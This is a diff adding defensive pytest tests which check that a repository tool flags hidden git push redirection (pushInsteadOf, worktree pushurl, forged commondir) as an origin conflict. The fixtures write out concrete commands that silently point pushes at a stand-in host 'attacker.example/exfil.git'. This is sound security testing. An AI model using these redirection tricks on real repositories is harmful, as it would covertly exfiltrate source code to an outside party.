@@ -271,6 +271,53 @@ async def test_git_url_rewrite_cannot_disguise_conflicting_origin(tmp_path: Path
 
 
 @pytest.mark.asyncio
+async def test_git_push_url_rewrite_cannot_redirect_bound_origin(tmp_path: Path) -> None:
+    """Git pushInsteadOf must not redirect a canonical stored origin."""
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    _git(workspace, "init", "--initial-branch=main")
+    _git(workspace, "remote", "add", "origin", _lease().clone_url)
+    hostile_url = "https://attacker.example/exfil.git"
+    _git(workspace, "config", "--local", f"url.{hostile_url}.pushInsteadOf", _lease().clone_url)
+    assert _git(workspace, "remote", "get-url", "--push", "origin") == hostile_url
+    config_before = (workspace / ".git" / "config").read_bytes()
+
+    payload = json.loads(await _tool(tmp_path, broker=_FakeBroker(), workspace=workspace).ensure_my_repository())
+
+    assert payload["status"] == "origin_conflict"
+    assert (workspace / ".git" / "config").read_bytes() == config_before
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("indirect_config", ["config.worktree", "commondir"])
+async def test_indirect_git_configuration_is_an_origin_conflict(tmp_path: Path, indirect_config: str) -> None:
+    """Git metadata indirection must not hide the effective push target."""
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    _git(workspace, "init", "--initial-branch=main")
+    _git(workspace, "remote", "add", "origin", _lease().clone_url)
+    hostile_url = "https://attacker.example/exfil.git"
+
+    if indirect_config == "config.worktree":
+        _git(workspace, "config", "--local", "extensions.worktreeConfig", "true")
+        _git(workspace, "config", "--worktree", "remote.origin.pushurl", hostile_url)
+    else:
+        external = tmp_path / "external"
+        external.mkdir()
+        _git(external, "init", "--initial-branch=main")
+        _git(external, "remote", "add", "origin", hostile_url)
+        (workspace / ".git" / "commondir").write_text(str(external / ".git"), encoding="utf-8")
+
+    assert _git(workspace, "remote", "get-url", "--push", "origin") == hostile_url
+    config_before = (workspace / ".git" / "config").read_bytes()
+
+    payload = json.loads(await _tool(tmp_path, broker=_FakeBroker(), workspace=workspace).ensure_my_repository())
+
+    assert payload["status"] == "origin_conflict"
+    assert (workspace / ".git" / "config").read_bytes() == config_before
+
+
+@pytest.mark.asyncio
 async def test_mismatched_push_url_is_an_origin_conflict(tmp_path: Path) -> None:
     """A hidden push URL must not bypass a matching credential-free fetch URL."""
     workspace = tmp_path / "workspace"
